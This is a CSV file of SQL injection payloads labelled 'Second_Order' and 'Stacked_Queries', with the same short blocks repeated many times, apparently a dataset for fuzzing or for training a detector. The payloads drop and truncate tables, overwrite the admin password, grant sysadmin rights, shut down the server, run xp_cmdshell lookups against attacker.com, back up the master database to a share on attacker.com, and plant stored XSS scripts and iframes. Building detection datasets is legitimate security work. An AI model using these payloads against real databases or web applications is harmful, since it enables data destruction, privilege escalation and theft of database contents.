Payload,Tipo
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
"'; INSERT INTO users (username, password) VALUES ('attacker', 'password')--",Second_Order
'; UPDATE users SET password='newpassword' WHERE username='admin'--,Second_Order
'; DROP TABLE logs;--,Second_Order
'; EXEC xp_cmdshell('nslookup attacker.com')--,Second_Order
"'; INSERT INTO comments (comment) VALUES ('<script>alert(""XSS"")</script>')--",Second_Order
"'; INSERT INTO users (username, email) VALUES ('attacker', 'attacker@evil.com')--",Second_Order
'; UPDATE settings SET config_value='insecure' WHERE config_key='security_level'--,Second_Order
"'; INSERT INTO orders (order_id, user_id) VALUES (999, 1)--",Second_Order
'; UPDATE users SET role='admin' WHERE username='guest'--,Second_Order
"'; INSERT INTO logs (entry) VALUES ('<iframe src=""http://attacker.com""></iframe>')--",Second_Order
"'; INSERT INTO profile (bio) VALUES ('<img src=""javascript:alert(1)"">')--",Second_Order
"'; INSERT INTO settings (name, value) VALUES ('malicious_key', '<script>alert(1)</script>')--",Second_Order
"'; INSERT INTO users (username, password) VALUES ('eviluser', 'evilpass')--",Second_Order
'; UPDATE users SET status='active' WHERE username='banneduser'--,Second_Order
'; UPDATE orders SET status='shipped' WHERE order_id=1--,Second_Order
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
'; INSERT INTO logs (entry) VALUES ('Attacked');--,Stacked_Queries
'; UPDATE users SET password='hacked' WHERE username='admin';--,Stacked_Queries
'; DELETE FROM orders WHERE order_id=1;--,Stacked_Queries
'; EXEC xp_cmdshell('ping attacker.com');--,Stacked_Queries
'; SHUTDOWN;--,Stacked_Queries
'; ALTER TABLE users ADD COLUMN hacked INT;--,Stacked_Queries
'; TRUNCATE TABLE logs;--,Stacked_Queries
'; BACKUP DATABASE master TO DISK='\\attacker.com\backup.bak';--,Stacked_Queries
'; DECLARE @cmd NVARCHAR(4000); SET @cmd='nslookup attacker.com'; EXEC(@cmd);--,Stacked_Queries
"'; EXEC sp_addsrvrolemember 'attacker', 'sysadmin';--",Stacked_Queries
'; GRANT ALL PRIVILEGES ON users TO 'attacker';--,Stacked_Queries
'; DENY INSERT ON orders TO public;--,Stacked_Queries
'; RECONFIGURE;--,Stacked_Queries
'; DROP TABLE users;--,Stacked_Queries
'; CREATE TABLE test (id INT);--,Stacked_Queries
